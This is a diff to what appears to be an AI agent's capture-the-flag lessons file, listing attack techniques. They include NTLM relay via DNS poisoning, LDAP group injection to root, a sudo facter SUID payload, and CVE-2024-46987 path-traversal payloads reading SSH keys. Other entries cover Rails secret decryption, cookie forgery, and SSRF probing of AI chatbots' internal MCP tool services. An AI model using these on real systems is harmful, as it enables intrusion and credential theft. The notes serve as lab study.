@@ -17,3 +17,32 @@
 #TunnelVision #RabbitHole #AgentBehavior #StuckLoop #ProposalLoop #CTF [2026-04-20] Issue: Agent kept re-proposing getTGT.py and Kerberos GSSAPI SSH after user confirmed these were tried and failed — failed to internalize "already tried" signals from user and ctf_state gaps -> Solution: When user says a vector did not work OR ctf_state is missing info, STOP proposing variations of that vector. Read ctf_state + strikes.md holistically; if state is incomplete ask user what WAS tried before proposing anything. Never re-propose getTGT.py or SSH GSSAPI variants after user dismissal.
 #NTLM #IPv6 #Fallback #SPNLookup #NTLMv2 #DNS #Relay #Kerberos #CrossSession [2026-04-22] Issue: Domain enforces Kerberos-only auth, but cross-session relay via IPv6 SOCKS tunnel succeeds because IPv6 numeric addresses don't have associated SPNs — SPN lookup fails, client falls back to NTLM -> Solution: When targeting domain with NTLM block on normal channels, try: (1) DNS poisoning (ADIDNS) to redirect hostname to attacker IPv6, (2) mstsc/curl to target that hostname (no SPN for IPv6 route), (3) Fallback to NTLMv2, (4) Relay or capture. Applicable to cross-session scenarios where target legitimately connects to a resolvable hostname that can be redirected.
 #ADCSEnum #certipy #ShellPorts #Authenticated #FirewallBypass #TemplateDiscovery [2026-04-22] Issue: LDAP port 389 blocked by firewall, making LDAP-based enumeration impossible. ADCS discovery still possible via Global Catalog port 3268 (TCP) and certipy when authenticated -> Solution: Always try certipy find -u USERNAME@DOMAIN -password PASS -dc-ip <DC_IP> even when LDAP 389 is closed; certipy uses UDP 53, TCP 3268 (GC), TCP 88 (Kerberos) — often available when 389 is not. Full template enumeration and ESC discovery still possible.
+#SSRF #FileRead #Recon #robots.txt #SourceDisclosure #LFI #Enumeration [2026-04-23] Issue: Found config.php via robots.txt + SSRF, got first creds and pivoted — never read the OTHER robots.txt-disallowed files (session.php, rate_limit.php) or app source code -> Solution: When a file-read primitive (SSRF, LFI, path traversal) is confirmed, exhaust ALL known interesting paths before pivoting. Treat the file-read primitive as a directory traversal pass: robots.txt entries, config files, app source, .env files, creds files. A single win from one file does NOT mean other files are empty.
+#LDAPAdmin #NSS #DockerEscape #GroupInjection #Privesc #CredentialExposure #nslcd [2026-04-23] Issue: /etc/ldap.conf (nslcd config) stored LDAP admin bindpw in plaintext on the host; NSS configured with passwd+group from ldap -> Solution: With LDAP admin creds, create a posixGroup in LDAP matching a privileged local group GID (docker=988, sudo=27); new SSH session merges LDAP groups → user gains group membership without modifying uidNumber; docker group → privileged container → host root. Check /etc/ldap.conf, /etc/nslcd.conf, /etc/sssd/sssd.conf for cleartext LDAP bind passwords when you have file read on any system using LDAP NSS.
+#MCPServer #SSRF #AITools #InternalServices #FileRead #LLMBackend #ToolExecutor #fetch #urllib [2026-04-23] Issue: LLM-backed apps often include internal MCP/tool-executor services (e.g. FastAPI on port 8001) that accept arbitrary URLs including file:// with no auth -> Solution: When an AI chatbot exposes tools (read_file, web_search), scan internal ports via the Docker bridge for tool-executor/MCP backends; these services frequently return raw content bypassing model summarization, making them superior SSRF primitives. Look for /fetch, /execute, /tools endpoints; probe with file:///etc/passwd to confirm.
+
+## sudo facter --custom-dir privesc (facter 4.x)
+- **Tags:** #privesc #sudo #facter #ruby
+- **Context:** `sudo facter` NOPASSWD; facter 4.x drops `-e` flag
+- **Technique:** Write Ruby fact file to `/tmp/evil.rb` with `system('chmod +s /bin/bash')`, then `sudo facter --custom-dir /tmp pwn`
+- **Follow-up:** `/bin/bash -p -c '<cmd>'` for euid=0 commands; clean up SUID with `/bin/bash -p -c 'chmod -s /bin/bash'`
+- **Note:** facter 3.x uses `-e 'exec("/bin/bash")'`; facter 4.x uses `--custom-dir`
+
+## CVE-2024-46987 — CamaleonCMS 2.9.0 path traversal
+- **Tags:** #path-traversal #camaleon #rails #file-read #CVE-2024-46987
+- **Context:** Authenticated (any role incl. self-registered `client`); endpoint `/admin/media/download_private_file?file=`
+- **Depth:** 1x `../` = Rails app root; 4x `../` = filesystem root
+- **Payloads:** `?file=../config/master.key`, `?file=../../../../etc/passwd`, `?file=../../../../home/<user>/.ssh/id_ed25519`
+- **Impact:** Read-any-file as the Rails process user (can be root in CTF deployments)
+
+## Rails credentials.yml.enc decryption from path traversal
+- **Tags:** #rails #credentials #master-key #AES-GCM #PBKDF2
+- **Context:** If `config/master.key` is readable, `config/credentials.yml.enc` can be decrypted offline
+- **Format:** AES-256-GCM; key = PBKDF2-HMAC-SHA256(master_key, salt="authenticated encrypted cookie", iterations=1000, length=32)
+- **Cookie decryption:** Same derivation; `_appname_session` cookie = `base64(ct)--base64(iv)--base64(tag)`, decrypted with derived key
+
+## CamaleonCMS auth_token cookie impersonation
+- **Tags:** #camaleon #session #auth-token #sqlite #impersonation
+- **Context:** CamaleonCMS stores `auth_token` in plaintext in `cama_users` table (production.sqlite3)
+- **Cookie format:** `{db_token}&{url-encoded-UA}&{ip}` — all three parts must match for auth to succeed
+- **Combined with file read:** Download DB via path traversal → extract token → forge cookie → full admin access without password
